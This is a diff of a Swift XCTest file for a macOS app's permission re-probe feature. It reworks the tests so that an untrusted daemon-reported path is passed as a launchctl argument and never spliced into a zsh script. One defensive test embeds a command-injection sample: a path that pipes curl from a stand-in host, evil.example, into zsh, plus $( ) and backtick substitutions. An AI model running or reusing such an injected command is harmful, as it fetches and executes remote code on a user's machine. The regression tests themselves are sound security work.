@@ -256,20 +256,88 @@ final class PermissionSubjectTests: XCTestCase {
 
     // MARK: - §11.4 席位重探（区分"没授权"与"授权了没重启"）
 
-    func testReprobeScriptCallsDaemonBinaryAndWritesJSON() {
-        let script = PermissionReprobe.script(
-            daemonBinaryPath: "/Users/dev/Applications/GlassPane Daemon.app/Contents/MacOS/glasspaned",
-            outputPath: "/tmp/out.json"
+    /// 重探任务的真值只能走 argv。从前 `script()` 把 daemon 自报的路径直接插进
+    /// `#!/bin/zsh` 的正文，而那个字段来自 `hello.identity`——本机同 uid 的任意进程
+    /// 都能写这条 socket，于是一个带 `$(…)` 的路径就是面板请 launchd 在用户的 GUI
+    /// 会话里替别人执行代码（`launchctl submit` 起的作业没有终端，回显不回来，
+    /// 症状是"什么都不发生"，所以这条通道被利用过也不会被人察觉）。
+    func testReprobeSubmissionPassesHostilePathsAsArgumentsNeverAsScriptText() throws {
+        let injected = "/tmp/glasspaned\" ; curl -s evil.example/x.sh | zsh  # $(touch /tmp/pwned)"
+        let output = "/tmp/out`id`.json"
+        let submission = try XCTUnwrap(PermissionReprobe.submission(
+            scriptPath: "/tmp/gp-reprobe.zsh", nonce: "42",
+            daemonBinaryPath: injected, outputPath: output,
+            arguments: PermissionReprobe.developerToolsArguments
+        ))
+
+        // 脚本正文是常量：外部值的任何片段都不许出现在里面。
+        XCTAssertEqual(submission.script, PermissionReprobe.positionalScript)
+        XCTAssertFalse(submission.script.contains("glasspaned"), "路径不许进正文")
+        XCTAssertFalse(submission.script.contains("curl"), "注入的命令不许进正文")
+        XCTAssertFalse(submission.script.contains("evil.example"))
+        XCTAssertFalse(submission.script.contains("out`id`"))
+        XCTAssertTrue(submission.script.contains("\"$1\""), "真值只以位置参数出现")
+        XCTAssertTrue(submission.script.contains("\"${@:3}\""))
+
+        // 真值全部在 argv 里，各自是一个完整参数（不会被 shell 二次解析）。
+        XCTAssertEqual(submission.command.launchPath, Launchctl.path)
+        XCTAssertEqual(
+            submission.command.arguments,
+            ["submit", "-l", "com.glasspane.reprobe.42", "--", "/tmp/gp-reprobe.zsh",
+             injected, output, "--check-developer-tools"]
         )
-        XCTAssertTrue(script.contains("#!/bin/zsh"))
-        XCTAssertTrue(script.contains("\"/Users/dev/Applications/GlassPane Daemon.app/Contents/MacOS/glasspaned\" --permissions"))
-        XCTAssertTrue(script.contains("> \"/tmp/out.json\""), "带空格路径必须整体加引号")
+        XCTAssertEqual(submission.command.jobLabel, "com.glasspane.reprobe.42")
+        XCTAssertTrue(submission.command.arguments.contains(injected),
+                      "注入样本只以\"一个参数\"的身份出现")
     }
 
-    func testReprobeSubmitCommandGoesThroughLaunchd() {
-        let command = PermissionReprobe.submitCommand(scriptPath: "/tmp/gp.zsh", nonce: "42")
+    /// 非绝对/含换行的路径不提交：`hello` 不可信时，宁可不跑这一趟。
+    func testReprobeSubmissionRefusesPathsThatCannotBeTrusted() {
+        for bad in ["", "/", "relative/glasspaned", "/tmp/a\nb", "/tmp/x\0y"] {
+            XCTAssertNil(
+                PermissionReprobe.submission(
+                    scriptPath: "/tmp/gp.zsh", nonce: "1",
+                    daemonBinaryPath: bad, outputPath: "/tmp/out.json"
+                ),
+                "daemon 自报程序路径 \((bad.isEmpty ? "<空>" : bad)) 仍被提交了一次一次性任务"
+            )
+        }
+        XCTAssertNil(PermissionReprobe.submission(
+            scriptPath: "/tmp/gp.zsh", nonce: "1",
+            daemonBinaryPath: "/x/glasspaned", outputPath: "not-absolute"
+        ), "输出路径同样要合规格")
+    }
+
+    func testReprobeScriptCallsDaemonBinaryAndWritesJSON() throws {
+        let submission = try XCTUnwrap(PermissionReprobe.submission(
+            scriptPath: "/tmp/gp.zsh", nonce: "7",
+            daemonBinaryPath: "/Users/dev/Applications/GlassPane Daemon.app/Contents/MacOS/glasspaned",
+            outputPath: "/tmp/out.json"
+        ))
+        XCTAssertTrue(submission.script.contains("#!/bin/zsh"))
+        XCTAssertTrue(submission.script.contains("> \"$2\" 2>&1"), "输出仍落到指定路径")
+        // 带空格的路径必须整体是一个 argv 元素——旧实现靠"给正文加引号"做到这点，
+        // 现在由 exec 的 argv 边界保证，脚本正文里已经不含这个路径。
+        XCTAssertEqual(
+            submission.command.arguments.filter { $0.contains("GlassPane Daemon.app") },
+            ["/Users/dev/Applications/GlassPane Daemon.app/Contents/MacOS/glasspaned"]
+        )
+        XCTAssertTrue(submission.command.arguments.contains("/tmp/out.json"))
+        XCTAssertEqual(submission.command.arguments.last, "--permissions",
+                       "缺省参数：一趟只跑席位快照")
+    }
+
+    func testReprobeSubmitCommandGoesThroughLaunchd() throws {
+        let command = try XCTUnwrap(PermissionReprobe.submission(
+            scriptPath: "/tmp/gp.zsh", nonce: "42",
+            daemonBinaryPath: "/x/glasspaned", outputPath: "/tmp/o.json"
+        )).command
         XCTAssertEqual(command.launchPath, Launchctl.path)
-        XCTAssertEqual(command.arguments, ["submit", "-l", "com.glasspane.reprobe.42", "--", "/tmp/gp.zsh"])
+        XCTAssertEqual(
+            command.arguments,
+            ["submit", "-l", "com.glasspane.reprobe.42", "--", "/tmp/gp.zsh",
+             "/x/glasspaned", "/tmp/o.json", "--permissions"]
+        )
     }
 
     func testReprobeParseReadsSubjectAndStatuses() {
@@ -495,17 +563,25 @@ final class PermissionSubjectTests: XCTestCase {
         XCTAssertTrue(text.contains("附加进程 被系统拒绝"))
     }
 
-    func testReprobeScriptCarriesDeveloperToolsArguments() {
-        let script = PermissionReprobe.script(
+    func testReprobeScriptCarriesDeveloperToolsArguments() throws {
+        let submission = try XCTUnwrap(PermissionReprobe.submission(
+            scriptPath: "/tmp/gp.zsh", nonce: "9",
             daemonBinaryPath: "/x/GlassPane Daemon.app/Contents/MacOS/glasspaned",
             outputPath: "/tmp/out.json",
             arguments: PermissionReprobe.developerToolsArguments
-        )
-        XCTAssertTrue(script.contains("--check-developer-tools"), "能力探测走 P6 的 CLI，不在面板进程里跑 lldb")
-        XCTAssertFalse(script.contains("--permissions"), "参数被替换而非追加，避免一次任务跑两件事")
+        ))
+        XCTAssertEqual(submission.command.arguments.last, "--check-developer-tools",
+                       "能力探测走 P6 的 CLI，不在面板进程里跑 lldb")
+        XCTAssertFalse(submission.command.arguments.contains("--permissions"),
+                       "参数被替换而非追加，避免一次任务跑两件事")
         // 默认参数仍是席位快照（回归保护）。
-        XCTAssertTrue(PermissionReprobe.script(daemonBinaryPath: "/x/glasspaned", outputPath: "/tmp/o.json")
-            .contains("--permissions"))
+        XCTAssertEqual(
+            try XCTUnwrap(PermissionReprobe.submission(
+                scriptPath: "/tmp/gp.zsh", nonce: "9",
+                daemonBinaryPath: "/x/glasspaned", outputPath: "/tmp/o.json"
+            )).command.arguments.last,
+            "--permissions"
+        )
     }
 
     func testDeveloperToolsInstructionOffersMachineVerification() {
